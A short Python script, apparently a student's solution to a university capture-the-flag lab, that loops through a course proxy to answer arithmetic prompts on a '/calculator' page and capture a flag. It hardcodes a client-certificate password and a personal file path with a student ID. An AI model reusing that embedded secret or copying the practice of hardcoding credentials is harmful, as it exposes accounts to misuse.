from requests_pkcs12 import post
import re
from time import sleep

base_url = 'http://haas.quoccabank.com/'
host_url = 'kb.quoccabank.com'
p12_path = '/Users/bryanle/Downloads/z5361001.p12'
p12_password = 'Qs3/Keg5W3D/kSJJfp9ltw=='

def find_flag(url_path):
    data_to_get = {
        'requestBox': f"""GET {url_path} HTTP/1.1
Host: {host_url}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: {base_url}
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: {base_url}
Connection: keep-alive

"""
    }

    response = post(url=base_url, data=data_to_get, pkcs12_filename=p12_path, pkcs12_password=p12_password)
    flag_pattern = re.compile('COMP6443{.*?}')
    flag_match = flag_pattern.search(response.text)
    cookie_regex = re.compile('session=.+\..+\..+; Expires')
    cookie_match = cookie_regex.search(response.text)
    session1 = cookie_match.group(0).split(';')
    cookie = session1[0]
    print(f"the cookie is: {cookie}")
    question = re.compile('[0-9]+\+[0-9]+')
    question_match = question.search(response.text)
    nums = question_match.group(0).split('+')
    num1 = int(nums[0])
    num2 = int(nums[1])
    sum = num1 + num2
    print(f"the sum of {num1} and {num2} is {sum}")
    while flag_match == None:

        body_content = f'answer={sum}'
        data_to_post = {
            'requestBox': f"""POST {url_path} HTTP/1.1
Host: {host_url}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: {base_url}
Content-Type: application/x-www-form-urlencoded
Content-Length: {str(len(body_content))}
Cookie: {cookie}
Origin: {base_url}
Connection: keep-alive

answer={sum}
"""
        }
        
        post_response = post(
            url=base_url, 
            data=data_to_post,
            pkcs12_filename=p12_path,
            pkcs12_password=p12_password
        )
        # check response
        print(post_response.text)
        cookie_regex = re.compile('session=.+\..+\..+; Expires')
        cookie_match = cookie_regex.search(post_response.text)
        session1 = cookie_match.group(0).split(';')
        cookie = session1[0]
        print(f"the new cookie should be: {cookie}")
        question = re.compile('[0-9]+\+[0-9]+')
        question_match = question.search(post_response.text)
        nums = question_match.group(0).split('+')
        num1 = int(nums[0])
        num2 = int(nums[1])
        sum = num1 + num2
        print(f"the new sum should be: the sum of {num1} and {num2} is {sum}")
        sleep(0.01)  
    return flag_match

flag = find_flag('/calculator')
print(f"The flag is: {flag}")